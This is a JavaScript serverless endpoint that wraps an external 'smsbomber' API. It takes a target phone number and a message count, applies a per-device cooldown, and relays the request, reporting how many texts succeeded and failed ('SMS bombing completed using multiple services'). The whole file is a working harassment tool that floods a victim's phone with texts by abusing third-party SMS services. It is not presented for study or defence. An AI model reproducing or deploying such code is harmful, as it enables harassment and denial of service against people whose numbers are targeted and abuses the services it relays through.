import crypto from "crypto";

// 15-minute cooldown (per device cookie)
const cooldowns = new Map();
const COOLDOWN_MS = 15 * 60 * 1000; // 15 minutes

function makeHybridIdHash(userAgent, deviceModel, cookieId) {
  const raw = `${userAgent}||${deviceModel}||${cookieId}`;
  return crypto.createHash("sha256").update(raw).digest("hex");
}

// Helper: Parse cookies
function parseCookies(cookieHeader = "") {
  if (!cookieHeader) return {};
  return Object.fromEntries(
    cookieHeader.split(";").map(c => {
      const [k, ...v] = c.trim().split("=");
      return [k, decodeURIComponent(v.join("="))];
    })
  );
}

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method Not Allowed" });
  }

  const { phoneNumber, amount } = req.body;

  if (!phoneNumber || !amount) {
    return res.status(400).json({ error: "Missing required fields" });
  }

  // Parse existing cookie or create one
  const cookies = parseCookies(req.headers.cookie);
  let cookieId = cookies.device_id;

  if (!cookieId) {
    cookieId = crypto.randomUUID();
    // set cookie; Max-Age 1 year, HttpOnly, SameSite Lax
    res.setHeader(
      "Set-Cookie",
      `device_id=${cookieId}; Path=/; Max-Age=31536000; HttpOnly; SameSite=Lax`
    );
  }

  const userAgent = (req.headers["user-agent"] || "unknown-ua").trim();
  const deviceModel =
    (req.headers["x-device-model"] ||
      req.headers["sec-ch-ua-platform"] ||
      (() => {
        const m = userAgent.match(/\(([^)]+)\)/);
        return m ? m[1].split(";").map(s => s.trim())[0] : "unknown-model";
      })()
    ).toString();

  // Generate device hash (uses cookie ID)
  const deviceId = makeHybridIdHash(userAgent, deviceModel, cookieId);

  // Cooldown check
  const lastTime = cooldowns.get(deviceId);
  const now = Date.now();

  if (lastTime && now - lastTime < COOLDOWN_MS) {
    const remaining = Math.ceil((COOLDOWN_MS - (now - lastTime)) / 1000);
    const minutes = Math.floor(remaining / 60);
    const seconds = remaining % 60;
    const readable =
      minutes > 0
        ? `${minutes} minute${minutes > 1 ? "s" : ""} and ${seconds} second${seconds !== 1 ? "s" : ""}`
        : `${seconds} second${seconds !== 1 ? "s" : ""}`;

    return res.status(429).json({
      error: `Please wait ${readable} before using this service again.`,
      remainingSeconds: remaining
    });
  }

  try {
    // Compose new GET endpoint using provided phone and amount
    // NOTE: phoneNumber and amount are URL-encoded to be safe
    const phoneParam = encodeURIComponent(String(phoneNumber));
    const amountParam = encodeURIComponent(String(amount));
    const downstreamUrl = `https://haji-mix-api.gleeze.com/api/smsbomber?phone=${phoneParam}&amount=${amountParam}`;

    const smsResponse = await fetch(downstreamUrl, {
      method: "GET",
      headers: {
        "Accept": "application/json"
        // No API key header — per request we've removed API key usage
      }
    });

    const downstream = await smsResponse.json().catch(() => ({}));

    if (smsResponse.ok) {
      // Set cooldown on successful 2xx response
      cooldowns.set(deviceId, Date.now());

      // If downstream already uses shape like you provided, return it directly.
      // Otherwise, try to normalize into that shape.
      if (typeof downstream.status === "boolean" && downstream.details) {
        // Return downstream as-is, but ensure we include a timestamp and phone/amount echo
        const enriched = {
          ...downstream,
          details: {
            ...downstream.details,
            requestedPhone: String(phoneNumber),
            requestedAmount: Number(amount),
            timestamp: new Date().toISOString()
          }
        };
        return res.status(200).json(enriched);
      }

      // Normalization fallback: attempt to map fields into your example shape
      const services = (downstream.services || downstream.details?.services) || {};
      const total_success =
        Number(downstream.total_success ?? downstream.successCount ?? downstream.successes ?? 0);
      const total_failed =
        Number(downstream.total_failed ?? downstream.failCount ?? downstream.failures ?? 0);

      const responsePayload = {
        status: true,
        message: downstream.message ?? "SMS bombing completed using multiple services.",
        details: {
          total_success: total_success,
          total_failed: total_failed,
          services: services
        },
        meta: {
          requestedPhone: String(phoneNumber),
          requestedAmount: Number(amount),
          timestamp: new Date().toISOString()
        }
      };

      return res.status(200).json(responsePayload);
    } else {
      // Propagate downstream non-2xx response (helpful for debugging)
      return res.status(smsResponse.status).json(downstream);
    }
  } catch (error) {
    return res.status(500).json({ error: error.message || "Internal Server Error" });
  }
               }
      
